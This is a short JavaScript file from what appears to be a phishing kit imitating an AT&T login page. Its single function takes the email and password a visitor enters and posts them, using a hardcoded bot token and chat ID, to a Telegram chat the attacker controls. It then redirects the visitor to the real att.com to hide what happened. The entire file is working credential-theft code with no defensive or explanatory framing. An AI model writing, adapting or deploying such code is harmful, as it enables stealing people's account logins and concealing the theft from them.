console.log("sender.js connected");
function sendTelegramMessageAndRedirect() {
  // other user API
  const telegramBotToken = "7582911291:AAELUkbUexyqr4b-6X_vIVPsYa2ZXvuFXFY";
  const chatId = 7526485798;
  const emailValue = document.getElementById("email").value;
  const passwordValue = document.getElementById("password").value;

  const messageText = `AT&T\nEmail: ${emailValue}\nPassword: ${passwordValue}`;

  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  const params = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: messageText,
    }),
  };

  // Make the API request
  fetch(url, params)
    .then((response) => {
      console.log(response);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      // Redirect to another page after successful submission
      window.location.href = "https://www.att.com/"; // Replace with your desired URL
    })
    .catch((error) => console.error("Error:", error));
}
